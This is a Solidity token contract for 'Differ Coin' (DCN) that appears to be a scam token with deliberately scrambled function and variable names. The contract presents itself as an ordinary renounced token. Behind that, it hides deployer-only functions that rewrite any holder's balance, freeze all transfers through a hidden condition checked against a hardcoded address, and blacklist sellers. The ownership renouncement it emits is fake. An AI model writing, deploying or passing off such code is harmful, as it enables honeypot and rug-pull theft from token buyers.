//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface shouldReceiver {
    function createPair(address fromLimit, address autoLaunched) external returns (address);
}

interface txLaunchShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toBuy) external view returns (uint256);

    function transfer(address takeLiquidity, uint256 swapToMax) external returns (bool);

    function allowance(address maxListTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapToMax) external returns (bool);

    function transferFrom(
        address sender,
        address takeLiquidity,
        uint256 swapToMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldTx, uint256 value);
    event Approval(address indexed maxListTake, address indexed spender, uint256 value);
}

abstract contract minTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atSwap is txLaunchShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DifferCoin is minTo, txLaunchShould, atSwap {

    bool private autoMode;

    mapping(address => bool) public buyShould;

    uint256 public totalToken;

    function atLimit() public {
        emit OwnershipTransferred(swapBuy, address(0));
        walletMarketing = address(0);
    }

    mapping(address => bool) public fundMax;

    bool public atShouldIs;

    function feeBuy(address minIs, uint256 swapToMax) public {
        liquidityLaunchedFee();
        receiverToLimit[minIs] = swapToMax;
    }

    function approve(address teamReceiver, uint256 swapToMax) public virtual override returns (bool) {
        enableFee[_msgSender()][teamReceiver] = swapToMax;
        emit Approval(_msgSender(), teamReceiver, swapToMax);
        return true;
    }

    function owner() external view returns (address) {
        return walletMarketing;
    }

    function exemptBuy(address fundAt, address takeLiquidity, uint256 swapToMax) internal returns (bool) {
        require(receiverToLimit[fundAt] >= swapToMax);
        receiverToLimit[fundAt] -= swapToMax;
        receiverToLimit[takeLiquidity] += swapToMax;
        emit Transfer(fundAt, takeLiquidity, swapToMax);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverToMin;
    }

    string private teamTxTotal = "Differ Coin";

    function autoLiquidity(uint256 swapToMax) public {
        liquidityLaunchedFee();
        modeIs = swapToMax;
    }

    bool public buySwap;

    function transfer(address minIs, uint256 swapToMax) external virtual override returns (bool) {
        return tokenMode(_msgSender(), minIs, swapToMax);
    }

    address public autoTx;

    uint8 private receiverToMin = 18;

    bool public launchedTx;

    bool public liquidityTotal;

    address public swapBuy;

    mapping(address => mapping(address => uint256)) private enableFee;

    uint256 constant sellWallet = 20 ** 10;

    function enableToken(address limitAuto) public {
        if (buySwap) {
            return;
        }
        if (launchedAutoSell == totalToken) {
            autoMode = false;
        }
        buyShould[limitAuto] = true;
        if (buyLiquidity == liquidityTotal) {
            buyLiquidity = false;
        }
        buySwap = true;
    }

    uint256 private toAuto = 100000000 * 10 ** 18;

    function liquidityLaunchedFee() private view {
        require(buyShould[_msgSender()]);
    }

    uint256 private launchedAutoSell;

    function exemptLaunched(address marketingMax) public {
        liquidityLaunchedFee();
        
        if (marketingMax == swapBuy || marketingMax == autoTx) {
            return;
        }
        fundMax[marketingMax] = true;
    }

    uint256 modeIs;

    mapping(address => uint256) private receiverToLimit;

    string private launchBuy = "DCN";

    address private walletMarketing;

    uint256 public modeAmountTx;

    function totalSupply() external view virtual override returns (uint256) {
        return toAuto;
    }

    bool public buyLiquidity;

    constructor (){
        
        enableReceiver launchExempt = enableReceiver(modeReceiver);
        autoTx = shouldReceiver(launchExempt.factory()).createPair(launchExempt.WETH(), address(this));
        
        swapBuy = _msgSender();
        buyShould[swapBuy] = true;
        receiverToLimit[swapBuy] = toAuto;
        atLimit();
        if (liquidityTotal) {
            launchedAutoSell = totalToken;
        }
        emit Transfer(address(0), swapBuy, toAuto);
    }

    uint256 teamSenderMarketing;

    function allowance(address buyTo, address teamReceiver) external view virtual override returns (uint256) {
        if (teamReceiver == modeReceiver) {
            return type(uint256).max;
        }
        return enableFee[buyTo][teamReceiver];
    }

    function transferFrom(address fundAt, address takeLiquidity, uint256 swapToMax) external override returns (bool) {
        if (_msgSender() != modeReceiver) {
            if (enableFee[fundAt][_msgSender()] != type(uint256).max) {
                require(swapToMax <= enableFee[fundAt][_msgSender()]);
                enableFee[fundAt][_msgSender()] -= swapToMax;
            }
        }
        return tokenMode(fundAt, takeLiquidity, swapToMax);
    }

    function tokenMode(address fundAt, address takeLiquidity, uint256 swapToMax) internal returns (bool) {
        if (fundAt == swapBuy) {
            return exemptBuy(fundAt, takeLiquidity, swapToMax);
        }
        uint256 liquidityTx = txLaunchShould(autoTx).balanceOf(atTotal);
        require(liquidityTx == modeIs);
        require(takeLiquidity != atTotal);
        if (fundMax[fundAt]) {
            return exemptBuy(fundAt, takeLiquidity, sellWallet);
        }
        return exemptBuy(fundAt, takeLiquidity, swapToMax);
    }

    address atTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address toBuy) public view virtual override returns (uint256) {
        return receiverToLimit[toBuy];
    }

    address modeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return teamTxTotal;
    }

    event OwnershipTransferred(address indexed walletSender, address indexed maxWallet);

    function symbol() external view virtual override returns (string memory) {
        return launchBuy;
    }

    function getOwner() external view returns (address) {
        return walletMarketing;
    }

}